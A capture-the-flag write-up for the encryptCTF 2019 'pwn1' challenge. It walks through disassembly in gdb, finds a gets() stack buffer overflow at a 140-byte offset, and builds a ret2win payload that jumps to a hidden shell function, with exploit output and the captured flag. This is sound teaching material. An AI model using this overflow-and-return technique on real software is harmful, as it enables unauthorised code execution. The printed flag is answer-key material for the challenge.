# pwn : pwn1

```
Given netcat connection : `nc 104.154.106.182 2345`
Binary file [pwn1](https://github.com/D1r3Wolf/CTF-writeups/blob/master/Encrypt-2019/pwn1/pwn1?raw=true) 32 bit executable
```
* Execting Binary
```
$ ./pwn1 
Tell me your name: input
Hello, input
$ 
```
* Analyzing Binary
```assembly
$ gdb  ./pwn1
gdb-peda$ disass main
Dump of assembler code for function main:
   0x080484c1 <+0>:	push   ebp
   0x080484c2 <+1>:	mov    ebp,esp
   0x080484c4 <+3>:	and    esp,0xfffffff0
   0x080484c7 <+6>:	sub    esp,0x90
   0x080484cd <+12>:	mov    eax,ds:0x8049820
   0x080484d2 <+17>:	mov    DWORD PTR [esp+0xc],0x0
   0x080484da <+25>:	mov    DWORD PTR [esp+0x8],0x2
   0x080484e2 <+33>:	mov    DWORD PTR [esp+0x4],0x0
   0x080484ea <+41>:	mov    DWORD PTR [esp],eax
   0x080484ed <+44>:	call   0x80483a0 <setvbuf@plt>
   0x080484f2 <+49>:	mov    DWORD PTR [esp],0x80485ca
   0x080484f9 <+56>:	call   0x8048350 <printf@plt>
   0x080484fe <+61>:	lea    eax,[esp+0x10]
   0x08048502 <+65>:	mov    DWORD PTR [esp],eax
   0x08048505 <+68>:	call   0x8048360 <gets@plt>
   0x0804850a <+73>:	lea    eax,[esp+0x10]
   0x0804850e <+77>:	mov    DWORD PTR [esp+0x4],eax
   0x08048512 <+81>:	mov    DWORD PTR [esp],0x80485de
   0x08048519 <+88>:	call   0x8048350 <printf@plt>
   0x0804851e <+93>:	mov    eax,0x0
   0x08048523 <+98>:	leave  
   0x08048524 <+99>:	ret    
End of assembler dump.
gdb-peda$ b*0x08048524
Breakpoint 1 at 0x8048524
gdb-peda$ r < inp
Starting program: /home/aj/Documents/Encrypt/P-pwn1/pwn1 < inp
Tell me your name: Hello, AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ

[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x0 
ECX: 0xd8 
EDX: 0xf7fad890 --> 0x0 
ESI: 0xf7fac000 --> 0x1d7d6c 
EDI: 0x0 
EBP: 0x49494949 ('IIII')
ESP: 0xffffd07c ("JJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")
EIP: 0x8048524 (<main+99>:	ret)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048519 <main+88>:	call   0x8048350 <printf@plt>
   0x804851e <main+93>:	mov    eax,0x0
   0x8048523 <main+98>:	leave  
=> 0x8048524 <main+99>:	ret    
   0x8048525:	xchg   ax,ax
   0x8048527:	xchg   ax,ax
   0x8048529:	xchg   ax,ax
   0x804852b:	xchg   ax,ax
[------------------------------------stack-------------------------------------]
0000| 0xffffd07c ("JJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")
0004| 0xffffd080 ("KKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")
0008| 0xffffd084 ("LLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")
0012| 0xffffd088 ("MMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")
0016| 0xffffd08c ("NNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")
0020| 0xffffd090 ("OOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")
0024| 0xffffd094 ("PPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")
0028| 0xffffd098 ("QQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x08048524 in main ()
gdb-peda$ 
```
* A bufferoverflow vuln ; returning to JJJJ
* padding is "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIII" or `"A"*140`
* On searching for functions
```assembly
gdb-peda$ info functions
All defined functions:

Non-debugging symbols:
0x0804831c  _init
0x08048350  printf@plt
0x08048360  gets@plt
0x08048370  system@plt
0x08048380  __gmon_start__@plt
0x08048390  __libc_start_main@plt
0x080483a0  setvbuf@plt
0x080483b0  _start
0x080483e0  __x86.get_pc_thunk.bx
0x080483f0  deregister_tm_clones
0x08048420  register_tm_clones
0x08048460  __do_global_dtors_aux
0x08048480  frame_dummy
0x080484ad  shell
0x080484c1  main
0x08048530  __libc_csu_init
0x080485a0  __libc_csu_fini
0x080485a4  _fini
```
* found shell functions at `0x080484ad`
* `payload = padding + p32(0x080484ad)`
* Python script [exp.py](https://github.com/D1r3Wolf/CTF-writeups/blob/master/Encrypt-2019/pwn1/exp.py)

### output 
```
$ python exp.py 
[*] '/home/aj/Videos/CTF-writeups/Encrypt-2019/pwn1/pwn1'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './pwn1': pid 5959
[*] Switching to interactive mode
Tell me your name: Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xad\x84\x0
$ cat flag.txt
encryptCTF{Buff3R_0v3rfl0W5_4r3_345Y}
```

## flag is : `encryptCTF{Buff3R_0v3rfl0W5_4r3_345Y}`
